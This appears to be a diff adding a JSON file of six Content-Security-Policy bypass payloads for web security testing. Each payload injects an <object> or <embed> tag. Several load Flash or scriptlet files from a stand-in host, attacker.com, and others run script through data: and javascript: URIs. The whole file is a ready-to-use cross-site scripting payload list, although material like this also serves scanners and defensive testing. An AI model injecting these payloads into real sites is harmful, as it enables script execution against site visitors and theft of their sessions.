@@ -1,0 +1,62 @@
+{
+  "category": "csp_bypass",
+  "subcategory": "object_injection",
+  "description": "Payloads exploiting permissive object-src — plugin-based script execution via <object>, <embed>, <applet>",
+  "count": 6,
+  "payloads": [
+    {
+      "id": "csp-obj-001",
+      "category": "csp_bypass",
+      "subcategory": "object_injection",
+      "payload": "<object data='https://attacker.com/evil.swf'></object>",
+      "description": "Flash object — executes SWF from attacker origin",
+      "technique": "object_injection",
+      "csp_bypass": "Permissive object-src allows loading Flash with ExternalInterface"
+    },
+    {
+      "id": "csp-obj-002",
+      "category": "csp_bypass",
+      "subcategory": "object_injection",
+      "payload": "<embed src='https://attacker.com/evil.swf' type='application/x-shockwave-flash'>",
+      "description": "Flash embed — alternative to object tag",
+      "technique": "object_injection",
+      "csp_bypass": "Permissive object-src allows embed tag with Flash"
+    },
+    {
+      "id": "csp-obj-003",
+      "category": "csp_bypass",
+      "subcategory": "object_injection",
+      "payload": "<object data='data:text/html,<script>alert(document.domain)</script>'></object>",
+      "description": "Object with data URI — creates HTML execution context",
+      "technique": "object_injection",
+      "csp_bypass": "Object tag with data: URI creates new browsing context"
+    },
+    {
+      "id": "csp-obj-004",
+      "category": "csp_bypass",
+      "subcategory": "object_injection",
+      "payload": "<embed src='data:text/html,<script>alert(document.domain)</script>'>",
+      "description": "Embed with data URI — creates HTML execution context",
+      "technique": "object_injection",
+      "csp_bypass": "Embed tag with data: URI may execute in permissive context"
+    },
+    {
+      "id": "csp-obj-005",
+      "category": "csp_bypass",
+      "subcategory": "object_injection",
+      "payload": "<object type='text/x-scriptlet' data='https://attacker.com/evil.sct'></object>",
+      "description": "Scriptlet object — IE/Edge legacy execution",
+      "technique": "object_injection",
+      "csp_bypass": "Scriptlet object type bypasses script-src in legacy browsers"
+    },
+    {
+      "id": "csp-obj-006",
+      "category": "csp_bypass",
+      "subcategory": "object_injection",
+      "payload": "<object data='javascript:alert(document.domain)'>",
+      "description": "Object with javascript: URI — direct script execution",
+      "technique": "object_injection",
+      "csp_bypass": "Object tag with javascript: URI may execute in some browsers"
+    }
+  ]
+}
